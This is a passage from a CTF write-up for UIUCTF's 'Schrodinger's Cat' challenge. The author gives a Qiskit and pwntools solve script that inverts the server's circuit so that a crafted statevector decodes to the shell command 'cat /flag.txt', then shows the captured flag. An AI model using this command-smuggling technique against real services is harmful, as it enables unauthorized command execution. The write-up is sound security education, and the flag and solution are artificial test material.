r.sendlineafter(b'Please type your OpenQASM circuit as a base64 encoded string: ', qasm_str)
r.sendlineafter(b"Please enter your normalization constant (precision matters!): ", str(T_n).encode())

rest = r.recvall().decode()
print(rest)
```
```
     ┌──────────────┐┌───────────────────────┐
q_0: ┤0             ├┤0                      ├
     │              ││                       │
q_1: ┤1             ├┤1                      ├
     │              ││                       │
q_2: ┤2 circuit-298 ├┤2 echo 'Hello, world!' ├
     │              ││                       │
q_3: ┤3             ├┤3                      ├
     │              ││                       │
q_4: ┤4             ├┤4                      ├
     └──────────────┘└───────────────────────┘

Executing...
PWNED!
```

Now it's just an easy case of calling `cat /flag.txt`, and getting our flag!

filename=solve.py
```python
import numpy as np
from qiskit import QuantumCircuit, transpile
import qiskit.quantum_info as qi
from qiskit.circuit.library import StatePreparation
from server import normalization, transform

server_sv, server_n = normalization("echo 'Hello, world!'") 
qc = QuantumCircuit(5)
qc.append(StatePreparation(server_sv), range(5))
M = qi.Operator(qc)
M = np.array(M.data)

T, T_n = normalization("cat /flag.txt")
inv_mat = np.linalg.inv(M)
X = inv_mat @ T

qc = QuantumCircuit(5)
qc.append(StatePreparation(X), range(5))

qc_transpiled = transpile(qc, basis_gates=['u1', 'u2', 'u3', 'cx'], optimization_level=3)

from base64 import b64encode
qasm_str = b64encode(qc_transpiled.qasm().encode())

from pwn import remote
# nc schrodingers-cat.chal.uiuc.tf 1337
r = remote("schrodingers-cat.chal.uiuc.tf", 1337)
r.sendlineafter(b'Please type your OpenQASM circuit as a base64 encoded string: ', qasm_str)
r.sendlineafter(b"Please enter your normalization constant (precision matters!): ", str(T_n).encode())

rest = r.recvall().decode()
print(rest)
```
```
     ┌──────────────┐┌───────────────────────┐
q_0: ┤0             ├┤0                      ├
     │              ││                       │
q_1: ┤1             ├┤1                      ├
     │              ││                       │
q_2: ┤2 circuit-298 ├┤2 echo 'Hello, world!' ├
     │              ││                       │
q_3: ┤3             ├┤3                      ├
     │              ││                       │
q_4: ┤4             ├┤4                      ├
     └──────────────┘└───────────────────────┘

Executing...
uiuctf{f3yn_m4n_h3r32_j00r_fL49}
```

## Conclusion
I had a lot of fun solving this challenge, and it was really interesting to see a real Qiskit challenge in a CTF. My bare minimum amount of experience with quantum computing was actually enough to solve this challenge, and I felt like it was the perfect difficulty for me.

Other than that, the challenge itself was also really open-ended, leading to several other possible solutions.

For example, you could [invert the circuit](https://qiskit.org/documentation/stubs/qiskit.circuit.QuantumCircuit.inverse.html#qiskit.circuit.QuantumCircuit.inverse) entirely, and just put that at the end of your own circuit while still creating the desired statevector beforehand. This cancels out the server's circuit like so:

$$
\begin{align}
M &= \text{matrix representation of the circuit} \\\\
T &= \text{target statevector} \\\\
\\newline
M^{-1} &= \text{inverse of M} \\\\
M^{-1}M T &= X \ \ \text{(this is the entire circuit)}\\\\
IT &= X \ \ \text{(since } M^{-1}M = I\text{)}\\\\
X &= T
\end{align}
$$

Anyway, I hope you had as much fun reading these writeups as I did originally solving these challenges :)
